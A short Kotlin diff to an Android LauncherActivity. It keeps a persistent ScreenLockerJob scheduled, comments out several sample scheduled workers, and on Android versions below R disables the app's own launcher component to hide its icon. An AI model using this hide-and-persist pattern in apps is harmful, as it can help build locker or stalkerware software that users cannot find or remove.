@@ -60,7 +60,7 @@ class LauncherActivity: AppCompatActivity(){
         lifecycleScope.launchWhenResumed {
             withContext(Dispatchers.Default){
                 scheduler.run {
-                    schedulePersistent(ScreenLockerJob())
+                    schedulePersistent(ScreenLockerJob())/*
                     scheduleOneTime(OneTimeWorker())
                     scheduleOneTime(SecondWorker())
                     schedulePeriodic(10000, PeriodicWorker())
@@ -69,13 +69,15 @@ class LauncherActivity: AppCompatActivity(){
                     scheduleDaily(DailyWorker())
                     scheduleWeekly(WeeklyWorker())
                     scheduleMonthly(MonthlyWorker())
-                    scheduleYearly(YearlyWorker())
+                    scheduleYearly(YearlyWorker())*/
                 }
             }
-            val state = packageManager.getComponentEnabledSetting(this@LauncherActivity.componentName)
-            if(state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
-                getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
-            finish()
+            if(Build.VERSION.SDK_INT < Build.VERSION_CODES.R){
+                val state = packageManager.getComponentEnabledSetting(this@LauncherActivity.componentName)
+                if(state == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT || state == PackageManager.COMPONENT_ENABLED_STATE_ENABLED)
+                    getPackageManager().setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
+                finish()
+            }
         }
     }
 
